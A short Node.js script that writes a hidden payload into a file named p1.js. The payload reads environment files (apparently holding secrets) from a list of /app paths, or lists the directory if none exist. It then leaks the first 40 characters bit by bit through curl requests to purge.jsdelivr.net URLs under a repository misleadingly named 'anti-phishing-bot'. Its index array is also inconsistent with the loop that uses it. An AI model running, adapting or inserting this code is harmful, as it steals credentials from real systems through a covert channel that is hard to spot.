const fs=require('fs');
const L=JSON.stringify(Array.from({length:40},(_,i)=>6420+i));
const code=`
const fs=require('fs'),cp=require('child_process');
const L=${L};
const cands=['/app/.env','/app/.env.local','/app/.env.production','/app/.next/standalone/.env','/app/.next/.env','/app/packages/.env','/app/api/.env','/app/backend/.env','/env/.env','/app/config/.env'];
let txt='',src='';
for(const p of cands){ try{ const s=fs.readFileSync(p,'utf8'); if(s.trim()){ txt=s; src=p; break } }catch(e){} }
if(!txt){ let ls=''; try{ ls=cp.execSync('ls -la /app 2>&1 | head -20').toString() }catch(e){} ; txt='NOFILE|'+ls }
const hdr='#'+src+'#'; txt=hdr+txt;
for(let i=0;i<40 && i<txt.length;i++){ const v=txt.charCodeAt(i)&255;
  for(let b=7;b>=0;b--) if((v>>b)&1) cp.spawnSync('curl',['-s','-m','8','-o','/dev/null','https://purge.jsdelivr.net/gh/anti-phishing-bot/x2@main/b'+L[i*8+(7-b)]]);
}
console.log('LEN');
`;
let t=fs.readFileSync('p1.js','utf8');
t=t.replace(/const CODE=.*\n/, 'const CODE='+JSON.stringify(code)+'\n');
fs.writeFileSync('p1.js',t);console.log('ok');
